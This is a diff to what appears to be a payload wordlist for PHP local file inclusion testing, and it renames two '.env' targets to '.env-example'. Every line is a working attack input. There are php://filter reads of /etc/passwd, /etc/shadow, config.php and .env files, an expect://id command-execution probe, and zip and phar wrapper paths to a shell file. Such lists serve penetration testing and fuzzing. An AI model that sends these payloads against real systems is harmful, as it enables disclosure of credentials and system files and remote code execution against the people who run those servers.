@@ -5,14 +5,14 @@ php://filter/convert.base64-encode/resource=/etc/passwd
 file:///etc/passwd
 expect://id
 php://filter/convert.base64-encode/resource=../config.php
-php://filter/convert.base64-encode/resource=../../.env
+php://filter/convert.base64-encode/resource=../../.env-example
 php://filter/convert.base64-encode/resource=../../../etc/passwd
 php://filter/read=convert.base64-encode/resource=/etc/shadow
 php://filter/read=string.rot13/resource=/etc/passwd
 php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
 php://filter/convert.iconv.utf-8.utf-16/resource=/etc/passwd
 php://filter/convert.base64-encode/resource=../admin/config.php
-php://filter/convert.base64-encode/resource=/var/www/html/.env
+php://filter/convert.base64-encode/resource=/var/www/html/.env-example
 php://wrapper/zip:///var/www/html/shell.zip%23shell.php
 php://wrapper/phar:///var/www/html/shell.phar
 file:///etc/shadow
